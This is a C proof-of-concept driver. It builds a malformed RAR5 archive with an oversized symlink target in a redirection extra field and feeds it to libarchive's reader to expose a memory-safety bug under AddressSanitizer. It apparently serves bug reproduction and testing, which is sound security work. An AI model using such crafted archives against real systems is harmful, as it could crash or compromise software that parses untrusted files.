/*
 * PoC driver: builds a RAR5 archive in memory whose single FILE entry
 * carries a redirection (EX_REDIR) extra field with a link target of
 * 4000 bytes, then parses it through libarchive's public read API.
 *
 * In-contract input: a (malformed) archive handed to the parser, which
 * must be handled safely.  Uses only public headers and public API.
 */
#include <archive.h>
#include <archive_entry.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * Ask the AddressSanitizer runtime (when linked in) to terminate with
 * abort() once it has printed its report, so a detected memory error
 * surfaces as SIGABRT.  Inert when ASan is not in use.
 */
#if defined(__SANITIZE_ADDRESS__) || defined(__has_feature)
const char *
__asan_default_options(void)
{
	return "abort_on_error=1";
}
#endif

/* Standard CRC-32 (ISO-HDLC), matching the RAR5 header checksum. */
static uint32_t crc_table[256];
static int crc_ready = 0;

static void
crc_init(void)
{
	uint32_t poly = 0xEDB88320U;
	int i, j;

	if (crc_ready)
		return;
	for (i = 0; i < 256; i++) {
		uint32_t c = (uint32_t)i;
		for (j = 0; j < 8; j++)
			c = (c & 1) ? (c >> 1) ^ poly : (c >> 1);
		crc_table[i] = c;
	}
	crc_ready = 1;
}

static uint32_t
crc32_calc(const uint8_t *p, size_t n)
{
	uint32_t c = 0xFFFFFFFFU;
	size_t i;

	for (i = 0; i < n; i++)
		c = crc_table[(c ^ p[i]) & 0xFF] ^ (c >> 8);
	return c ^ 0xFFFFFFFFU;
}

/* RAR5 variable-length integer: little-endian base-128. */
static size_t
emit_varint(uint8_t *out, uint64_t v)
{
	size_t n = 0;

	do {
		uint8_t b = (uint8_t)(v & 0x7F);
		v >>= 7;
		if (v != 0)
			b |= 0x80;
		out[n++] = b;
	} while (v != 0);
	return n;
}

static void
emit_u32le(uint8_t *out, uint32_t v)
{
	out[0] = (uint8_t)(v & 0xFF);
	out[1] = (uint8_t)((v >> 8) & 0xFF);
	out[2] = (uint8_t)((v >> 16) & 0xFF);
	out[3] = (uint8_t)((v >> 24) & 0xFF);
}

#define TARGET_SIZE 4000

int
main(void)
{
	static uint8_t buf[8192];
	static uint8_t h[4100];
	size_t len = 0, hl, body_off;
	uint32_t c;
	struct archive *a;
	struct archive_entry *e;
	int r;

	crc_init();

	/* RAR5 signature. */
	memcpy(buf + len, "Rar!\x1a\x07\x01\x00", 8);
	len += 8;

	/*
	 * HEAD_MAIN: id=1, flags=0, archive_flags=0.
	 * raw_hdr_size = 3, so header = varint(3) + 3 body bytes.
	 */
	hl = 0;
	hl += emit_varint(h + hl, 3);
	h[hl++] = 0x01;
	h[hl++] = 0x00;
	h[hl++] = 0x00;
	c = crc32_calc(h, hl);
	emit_u32le(buf + len, c);
	len += 4;
	memcpy(buf + len, h, hl);
	len += hl;

	/*
	 * HEAD_FILE: id=2, flags=HFL_EXTRA_DATA|HFL_DATA, one regular
	 * file "a" with an EX_REDIR extra field (unix symlink) whose
	 * link target is TARGET_SIZE bytes long.
	 *
	 * extra field payload: type=1, flags=0, target_size, target.
	 * extra_field_size = 1 (id) + 1 + 1 + varint(target_size) + target;
	 * extra_data_size = varint(field_size) + field_size;
	 * raw_hdr_size = 12 bytes of fixed fields + extra_data_size.
	 */
	{
		uint8_t tmp[8];
		size_t field_size, edata_size, raw_hdr_size;

		field_size = 3 + emit_varint(tmp, TARGET_SIZE) + TARGET_SIZE;
		edata_size = emit_varint(tmp, field_size) + field_size;
		raw_hdr_size = 12 + edata_size;

		hl = 0;
		hl += emit_varint(h + hl, raw_hdr_size);
		body_off = hl;
		h[hl++] = 0x02;			/* HEAD_FILE */
		h[hl++] = 0x03;			/* HFL_EXTRA_DATA | HFL_DATA */
		hl += emit_varint(h + hl, edata_size);
		hl += emit_varint(h + hl, 0);	/* data_size */
		hl += emit_varint(h + hl, 0);	/* file_flags */
		hl += emit_varint(h + hl, 0);	/* unpacked_size */
		hl += emit_varint(h + hl, 0);	/* file_attr */
		hl += emit_varint(h + hl, 0);	/* compression_info */
		hl += emit_varint(h + hl, 1);	/* host_os = unix */
		hl += emit_varint(h + hl, 1);	/* name_size */
		h[hl++] = 'a';
		hl += emit_varint(h + hl, field_size);
		h[hl++] = 0x05;			/* EX_REDIR */
		h[hl++] = 0x01;			/* redir_type = unix symlink */
		h[hl++] = 0x00;			/* redir_flags */
		hl += emit_varint(h + hl, TARGET_SIZE);
		memset(h + hl, 'B', TARGET_SIZE);
		hl += TARGET_SIZE;
		if (hl != body_off + raw_hdr_size) {
			fprintf(stderr, "internal construction error\n");
			return 2;
		}
	}
	c = crc32_calc(h, hl);
	emit_u32le(buf + len, c);
	len += 4;
	memcpy(buf + len, h, hl);
	len += hl;

	/* Parse the archive through the public API. */
	a = archive_read_new();
	if (a == NULL)
		return 2;
	archive_read_support_format_rar5(a);
	r = archive_read_open_memory(a, buf, len);
	if (r != ARCHIVE_OK) {
		archive_read_free(a);
		return 0;
	}
	while ((r = archive_read_next_header(a, &e)) == ARCHIVE_OK) {
		archive_read_data_skip(a);
	}
	archive_read_free(a);
	return 0;
}
